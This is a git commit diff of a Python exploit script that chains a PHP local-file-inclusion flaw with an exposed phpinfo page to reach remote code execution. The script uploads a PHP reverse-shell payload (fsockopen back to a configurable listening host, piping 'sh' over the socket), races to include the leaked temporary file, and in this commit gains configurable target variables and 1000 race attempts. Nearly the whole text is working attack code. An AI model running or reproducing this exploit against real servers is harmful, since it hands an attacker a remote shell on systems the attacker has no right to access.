d4bac196fe23ce97185658c47f5f66950b0daf31
afkfr0mkeyb0ard <123593001+afkfr0mkeyb0ard@users.noreply.github.com>
2024-03-09 14:35:18 +0100

    Update and rename phpinfo_lfi_to_rce.py to phpinfoLFI2rce.py

--- phpinfoLFI2rce.py
+++ phpinfoLFI2rce.py
@@ -5,23 +5,36 @@ import socket
 import requests
 
 ####################################################################################################
-#   CHANGE YOUR LISTENING HOST AND PORT ON LINE 17
-#   CHANGE THE POST DATA WITH VULNERABLE PARAMETER ON LINE 22
-#   CHANGE THE VULNERABLE PAGE AND COOKIE ON LINE 23
-#   CHANGE THE VULNERABLE PAGE AND COOKIE ON LINE 41
+#   CHANGE THE VARIABLES BELOW
 #   RUN > python3 phpinfoLFI2rce.py <target IP> <target port> <threads>
+
+LISTENING_HOST = "127.0.0.1"
+LISTENING_PORT = 80
+VULNERABLE_PAGE = "/lfi.php"
+COOKIE = "session=<jwt>"
+POST_DATA_WITH_LFI = "action=show_logs&file="  #The file parameter here is the one vulnerable, must be the last and empty
 ####################################################################################################
+
 
 def setup(host, port):
     TAG = "Security Test"
-    PAYLOAD = f"{TAG}\r\n<?php $sock=fsockopen(\"<HOST>\",<PORT>);$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>\r"
+    PAYLOAD = f"{TAG}\r\n<?php $sock=fsockopen(\"{LISTENING_HOST}\",{LISTENING_PORT});$proc=proc_open(\"sh\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>\r"
     REQ1_DATA = f"-----------------------------7dbff1ded0714\r\nContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\r\nContent-Type: text/plain\r\n\r\n{PAYLOAD}\n-----------------------------7dbff1ded0714--\r"
 
     padding = "A" * 8000
     REQ1 = f"POST /phpinfo.php?a={padding} HTTP/1.1\r\nCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r\nHTTP_ACCEPT: {padding}\r\nHTTP_USER_AGENT: {padding}\r\nHTTP_ACCEPT_LANGUAGE: {padding}\r\nHTTP_PRAGMA: {padding}\r\nX-Forwarded-For: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r\nContent-Length: {len(REQ1_DATA)}\r\nHost: {host}\r\n\r\n{REQ1_DATA}"
-    REQ2_DATA = "<POST_DATA_WITH_LFI>" #ie: "action=show_logs&file="
-    LFIREQ = f"POST /<VULNERABLE_PAGE> HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: {host}\r\nContent-Length: %s\r\nCookie: session=<COOKIE>;\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n\r\n{REQ2_DATA}%s\r\n"
+    REQ2_DATA = f"{POST_DATA_WITH_LFI}" 
+    LFIREQ = f"POST /{VULNERABLE_PAGE} HTTP/1.1\r\nUser-Agent: Mozilla/4.0\r\nProxy-Connection: Keep-Alive\r\nHost: {host}\r\nContent-Length: %s\r\nCookie: {COOKIE};\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n\r\n{REQ2_DATA}%s\r\n"
     return (REQ1, TAG, LFIREQ)
+
+def getPostData(string):
+    string_split = string.split("&")
+    result = {}
+    for el in string_split:
+        key = el.split("=")[0]
+        value = el.split("=")[1]
+        result[key] = value
+    return result
 
 def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -38,7 +51,9 @@ def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
         except ValueError:
             return None
 
-        x = requests.post(f'http://{host}:{port}/<VULNERABLE_PAGE>', data={'<PARAM1>':'<VALUE1>','file':fn}, cookies={'session':'<COOKIE>;'})
+        post_data = getPostData(POST_DATA_WITH_LFI)
+        post_data[POST_DATA_WITH_LFI.split('&')[-1].split('=')[-2]] = fn
+        x = requests.post(f'http://{host}:{port}/{VULNERABLE_PAGE}', data=post_data, cookies={'session':COOKIE.split('=')[1]})
 
         if tag.encode('utf-8') in d:
             return fn
@@ -116,7 +131,7 @@ def main():
     offset = getOffset(host, port, reqphp)
     print("done")
 
-    maxattempts = 1 ### MAX ATTEMPTS ##############################################################################
+    maxattempts = 1000 ### MAX ATTEMPTS ##############################################################################
     e = threading.Event()
     l = threading.Lock()
 
